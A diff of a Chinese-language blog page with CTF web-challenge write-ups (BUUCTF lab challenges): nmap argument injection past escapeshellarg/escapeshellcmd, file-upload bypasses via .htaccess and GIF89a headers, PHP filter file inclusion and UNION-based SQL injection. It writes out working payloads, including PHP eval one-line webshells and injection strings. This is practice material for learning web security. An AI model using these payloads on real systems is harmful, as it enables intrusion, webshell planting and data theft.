@@ -513,7 +513,7 @@
 
         <div class="post-content">
             <p>2023-01-04 WP</p>
-<h1 id="T1-RaaS-v1"><a href="#T1-RaaS-v1" class="headerlink" title="T1 RaaS-v1"></a>T1 RaaS-v1</h1><p>题目提示<code>curl</code>和<code>read the docs</code>，并给出了二进制源码，用010 Editor或其他编辑器打开，得到如下源码：</p>
+<h1 id="T1-ASIS-ctf-final-2022-RaaS-v1"><a href="#T1-ASIS-ctf-final-2022-RaaS-v1" class="headerlink" title="T1 [ASIS ctf final 2022]RaaS-v1"></a>T1 [ASIS ctf final 2022]RaaS-v1</h1><p>题目提示<code>curl</code>和<code>read the docs</code>，并给出了二进制源码，用010 Editor或其他编辑器打开，得到如下源码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123;     </span><br><span class="line">	die(&#x27;curl :thonk:&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = &#x27;http://localhost&#x27;;</span><br><span class="line">$method = &#x27;GET&#x27;;</span><br><span class="line">$formParams = [];</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;                        </span><br><span class="line">	$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;method&#x27;]))&#123;</span><br><span class="line">	$method = $_GET[&#x27;method&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;formParams&#x27;]))&#123;                 </span><br><span class="line">	$formParams = $_GET[&#x27;formParams&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = &#x27;curl &#x27;;</span><br><span class="line">$cmd .= &#x27;--proto -file &#x27;; </span><br><span class="line">$cmd .= escapeshellarg($url).&#x27; &#x27;;</span><br><span class="line">$cmd .= &#x27;-X &#x27;;</span><br><span class="line">$cmd .= escapeshellarg($method).&#x27; &#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($formParams as $key =&gt; $value)&#123;</span><br><span class="line">	if(preg_match(&quot;/^\w+$/&quot;,$key))&#123;</span><br><span class="line">		$cmd .= &#x27;-F &#x27;;</span><br><span class="line">		$cmd .= escapeshellarg($key.&#x27;= &#x27;.$value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/plain&#x27;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>
 
 <p>并且在源码中可以发现<code>raas-v1/flag.txt</code>，猜测这题要我们利用<code>curl命令</code>读取文件，获取flag.</p>
@@ -542,7 +542,8 @@
 <blockquote>
 <p>参考丹子哥的wp: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ccuu/articles/17023814.html">一个curl的绕过</a><br><br>参考curl手册: <a target="_blank" rel="noopener" href="https://curl.se/docs/manpage.html">curl.se</a><br><br>参考小姿势: <a target="_blank" rel="noopener" href="https://www.77169.net/html/196478.html">绕过限制利用curl读取写入文件</a></p>
 </blockquote>
-<h1 id="T2-BUUCTF-2018-Online-Tool"><a href="#T2-BUUCTF-2018-Online-Tool" class="headerlink" title="T2 [BUUCTF 2018]Online Tool"></a>T2 [BUUCTF 2018]Online Tool</h1><p>为了针对<code>escapeshellarg()</code>函数的绕过进行学习，这里直接嫖一道相关的题来分析。源码直接给出：</p>
+<h1 id="T2-BUUCTF-2018-Online-Tool"><a href="#T2-BUUCTF-2018-Online-Tool" class="headerlink" title="T2 [BUUCTF 2018]Online Tool"></a>T2 [BUUCTF 2018]Online Tool</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目地址</a></p>
+<p>为了针对<code>escapeshellarg()</code>函数的绕过进行学习，这里直接嫖一道相关的题来分析。源码直接给出：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);                      // @为错误控制运算符，附加到表达式前面时，任何可能出现的由该表达式生成的诊断错误将被抑制</span><br><span class="line">    chdir($sandbox);                       // 改变当前的目录为上一步创建的$sandbox</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p><code>$host</code>是可控的，依次经过<code>escapeshellarg</code>和<code>escapeshellcmd</code>处理，然后拼接到nmap语句中，猜想可以利用<code>nmap</code>语法实现RCE. 查询Nmap手册，先对源码中nmap语句进行解析：</p>
@@ -591,6 +592,159 @@
 <blockquote>
 <p>最后的最后还是留下一个小问题，求助求助：<br><br>Q 为什么我kali执行nmap命令时，如果不用<code>&#39;&#39;</code>将一句话木马括起来就无法执行，而这里最终执行时的一句话木马是可以不被<code>&#39;&#39;</code>括起来的。<br><br>指路1：一个很漂亮的Nmap思维导图<a target="_blank" rel="noopener" href="https://blog.csdn.net/ZripenYe/article/details/123344685?ops_request_misc=&request_id=&biz_id=102&utm_term=nmap%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-123344685.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_control1&spm=1018.2226.3001.4187">Nmap 基本使用指南思维导图（原创）</a><br><br>指路2：<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
 </blockquote>
+<p>2023-01-06 WP</p>
+<h1 id="T3-网鼎杯-2020-朱雀组-Nmap"><a href="#T3-网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="T3 [网鼎杯 2020 朱雀组]Nmap"></a>T3 [网鼎杯 2020 朱雀组]Nmap</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap">题目地址</a></p>
+<p>再来一道Nmap的题感受一下~进去就是一个网页版NMAP扫描器。先查看页面源代码，发现采用POST方法传入数据<code>host</code>，猜想是被用来拼接成完整Nmap语句，继而进行查询。并且得到提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag is in /flag --&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>简单输入一个IP测试一下，发现有回显结果：</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test3.png" class="" title="测试回显结果">
+
+<p>先考虑RCE</p>
+<p>我们知道，Linux下的管道符<code>|</code>能够<strong>将两个或者多个命令连接到一起，把一个命令的输出作为下一个命令的输入</strong>，利用这一点，如果直接在nmap语句后拼接<code>|</code>，就可以实现命令执行：</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test3-1.png" class="" title="本地测试">
+
+<p>然而，在这里没能实现，并且可以看到<code>|</code>前加了<code>\</code>。</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test3-1.png" class="" title="本地测试">
+
+<p>联系T2的<code>escapeshellarg</code>和<code>escapeshellcmd</code>处理，估计这里也用到了这俩，再用引号<code>&#39;</code>试一下，同样变成了<code>\&#39;</code>。因此直接依靠<code>|</code>实现命令拼接就无法实现了。</p>
+<h3 id="上传一句话木马"><a href="#上传一句话木马" class="headerlink" title="上传一句话木马"></a>上传一句话木马</h3><p>借用T2的思路，利用nmap的格式化输出，尝试上传一句话木马:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[a]);?&gt; -oG webshell.php &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>结果被发现是”Hacker”，估计是对某些字符串进行了过滤（可以通过测试发现<code>php</code>被过滤），利用<code>&lt;?=</code>来代替<code>&lt;?php</code>进行绕过，并修改文件名后缀为<code>phtml</code></p>
+<blockquote>
+<p><code>&lt;? ?&gt;</code>是短标签，<code>&lt;?php ?&gt;</code>是长标签。在php的配置文件（php.ini）中有一个<code>short_open_tag</code>的值（开启on），开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code> 同时，只有开启这个才可以使用 <code>&lt;?=</code> 以代替 <code>&lt;?php</code> 。</p>
+</blockquote>
+<blockquote>
+<p>PHTML（有时叫做PHP）网页是一种包含PHP（一种和JavaScript或 Microsoft VBScript类似的语言）脚本的网页和ASP一样，PHP脚本镶嵌在网页的HTML代码之中。在页面被发送给请求的用户之前，网页服务器调用PHP解释程序来解释和执行PHP脚本。含有PHP脚本的网页通常都以“.php”、“.php3”或“.phtml”作为后缀。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?= @eval($_POST[a]);?&gt; -oG webshell.phtml &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>上传成功，直接蚁剑连接获取Flag.</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/shell3.png" class="" title="上传成功">
+
+<h3 id="利用-iL参数实现Nmap读取任意文件"><a href="#利用-iL参数实现Nmap读取任意文件" class="headerlink" title="利用-iL参数实现Nmap读取任意文件"></a>利用<code>-iL</code>参数实现Nmap读取任意文件</h3><p>nmap有两个参数如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-iL     从inputfilename文件中读取扫描的目标</span><br><span class="line">-oN     把扫描结果重定向到一个可读的文件logfilename中</span><br></pre></td></tr></table></figure>
+
+<p>我们已知flag在根目录下的<code>/flag</code>，那么利用<code>nmap -iL /flag -oN flag.txt</code>就可以实现将读取的flag结果写到当前目录下的flag.txt里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，这里前后都需要添加<strong>空格</strong>，其被处理的过程如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;                  # 原payload</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27; -iL /flag -oN flag.txt &#x27;\&#x27;&#x27;&#x27;          # escapeshellarg处理：先对两个单引号转义，再添加三对单引号连接</span><br><span class="line">&#x27;&#x27;\\&#x27;&#x27; -iL /flag -oN flag.txt &#x27;\\&#x27;&#x27;&#x27;        # escapeshellcmd处理</span><br><span class="line">最后变成:</span><br><span class="line">\\ -iL /flag -oN flag.txt \</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag.</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/flag3.png" class="" title="Flag">
+
+<h2 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用 -oG 传马</span><br><span class="line">&#x27;&lt;?= @eval($_POST[a]);?&gt; -oG webshell.phtml &#x27;</span><br><span class="line">利用 -iL 读文件</span><br><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dongguol/p/5910617.html">php中的短标签</a></p>
+</blockquote>
+<p>2023-01-08 WP</p>
+<h1 id="T4-MRCTF2020-你传你🐎呢"><a href="#T4-MRCTF2020-你传你🐎呢" class="headerlink" title="T4 [MRCTF2020]你传你🐎呢"></a>T4 [MRCTF2020]你传你🐎呢</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2">题目地址</a></p>
+<p>这是一道文件上传漏洞的题目。先直接传一个一句话木马<code>webshell.php</code>试试，果然不行，应该是对php文件进行了过滤。修改后缀为<code>.jpg</code>上传成功。</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/upload.png" class="" title="上传成功">
+
+<p>并且给出了文件上传的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/9b2fe7222128f385ff624d25edcc2ab3/webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>接下来想办法<strong>将jpg文件解析为php文件</strong>，这里参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ialoe/p/520web1.html#d">Dest0g3 520迎新赛 funny_upload</a>的思路，利用<code>.htaccess文件(或者&quot;分布式配置文件&quot;）</code>实现。</p>
+<blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<p>上传<code>.htaccess</code>文件（注意修改Content-Type为<code>image/jpeg</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Addtype application/x-httpd-php .jpg</span><br><span class="line">#将以 jpg 为后缀的文件当做 php 解析</span><br></pre></td></tr></table></figure>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/he.png" class="" title="上传htaccess文件">
+
+<p>显示”&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;9b2fe7222128f385ff624d25edcc2ab3&#x2F;.htaccess succesfully uploaded!”，上传成功。接下来用蚁剑连接，获取flag。</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/ant4.png" class="" title="蚁剑">
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/snowlyzz/article/details/126267637">.htaccess的利用方法和技巧</a></p>
+</blockquote>
+<h1 id="T5-极客大挑战-2019-Upload"><a href="#T5-极客大挑战-2019-Upload" class="headerlink" title="T5 [极客大挑战 2019]Upload"></a>T5 [极客大挑战 2019]Upload</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload">题目地址</a></p>
+<p>要求上传图片，传入上一题的图片马，然后在bp中重新修改后缀为php，被告知”NOT！php!”，于是改后缀为”phtml”</p>
+<blockquote>
+<p>绕过后缀的有文件格式有<code>php, php3, php4, php5, phtml, pht</code></p>
+</blockquote>
+<p>又发现<code>&lt;?</code>被过滤，利用<code>&lt;script&gt;</code>尝试绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>仍然失败，并且被告知 “Don’t lie to me, it’s not image at all!!!”，利用<code>GIF89a</code>图片头文件欺骗进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/success4.png" class="" title="上传成功">
+
+<p>但是不知道上传路径，猜测是在&#x2F;upload下，利用蚁剑成功连接，获取flag.</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hcflyy/p/3568839.html">GIF89a图片头文件欺骗</a><br><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197631">PHP Webshell检测与绕过</a></p>
+</blockquote>
+<h1 id="T6-极客大挑战-2019-Secret-File"><a href="#T6-极客大挑战-2019-Secret-File" class="headerlink" title="T6 [极客大挑战 2019]Secret File"></a>T6 [极客大挑战 2019]Secret File</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File">题目地址</a></p>
+<p>查看源码，发现<code>href=&quot;./Archive_room.php&quot;</code>，进入点击SECRET，提示我们“查阅结束”，直接抓包查看</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/bp.png" class="" title="抓包">
+
+<p>进入审计页面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>可以看到对传入的file进行了一定的过滤。其中，<code>strstr()</code>有如下作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE（stristr为不区分大小写搜索）</span><br></pre></td></tr></table></figure>
+
+<p>先尝试直接传入<code>file=flag.php</code>，告诉我们对flag不可见。</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/fail.png" class="" title="fail">
+
+<p>考虑文件包含漏洞</p>
+<blockquote>
+<p>常见的文件包含函数有<code>include(), require(), include_once(), require_once()</code>，当我们使用上述的四个函数进行文件包含的时候，如果被包含的文件符合PHP语法规范，那么任何拓展名都会被PHP解析。如果包含的是非PHP规范的源代码或文件，则会暴露其源代码或者文件内容。对于符合PHP规范的文件，我们在利用时，可以通过file:&#x2F;&#x2F;或者php:&#x2F;&#x2F;这样的伪协议来读取源代码。</p>
+</blockquote>
+<p>利用PHP filter伪协议构造Payload</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/wxy.png" class="" title="伪协议">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>最后对读取的源代码进行base64解码即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NjBkMWFmYmEtZDNlZi00OTc2LThmNDAtNDM0NDZlYWU3ZjAyfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag = &#x27;flag&#123;60d1afba-d3ef-4976-8f40-43446eae7f02&#125;&#x27;;</span><br><span class="line">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44508748/article/details/108162951#:~:text=PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%8C%87%E7%9A%84%E6%98%AFPHP%E6%89%80%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%9C%A8web%E6%B8%97%E9%80%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E5%B8%B8%E7%94%A8%E4%BA%8E%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8Cweb%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E3%80%82%201.php.ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%82%E6%95%B0%EF%BC%9A%20allow_url_fopen,%EF%BC%9Aon%20%23%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%20%EF%BC%8C%E8%A1%A8%E7%A4%BA%E5%85%81%E8%AE%B8url%E9%87%8C%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%EF%BC%9B">漏洞梳理篇之php伪协议</a></p>
+</blockquote>
+<h1 id="T7-极客大挑战-2019-LoveSQL"><a href="#T7-极客大挑战-2019-LoveSQL" class="headerlink" title="T7 [极客大挑战 2019]LoveSQL"></a>T7 [极客大挑战 2019]LoveSQL</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL">题目地址</a></p>
+<p>一道很常规的SQL注入题，用万能密码<code>1&#39; or 1=1#</code>登录，未找到什么可用信息，一步一步爆信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 4#</span><br></pre></td></tr></table></figure>
+<p>爆字段数，得知字段数为 3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
+<p>联合查询，测试注入点（回显点位）</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test7.png" class="" title="测试注入点">
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,(group_concat(table_name))from(information_schema.tables)where(table_schema=database())#</span><br></pre></td></tr></table></figure>
+<p>爆表名，得到<code>geekuser,l0ve1ysq1</code>两个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;l0ve1ysq1&#x27;)#</span><br></pre></td></tr></table></figure>
+<p>爆字段名，得到<code>id,username,password</code>三个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
+<p>爆数据，成功拿到flag.</p>
+<blockquote>
+<p><a href="https://ex1le23.github.io/2022/12/15/SQL%E6%B3%A8%E5%85%A5/">SQL注入基础</a></p>
+</blockquote>
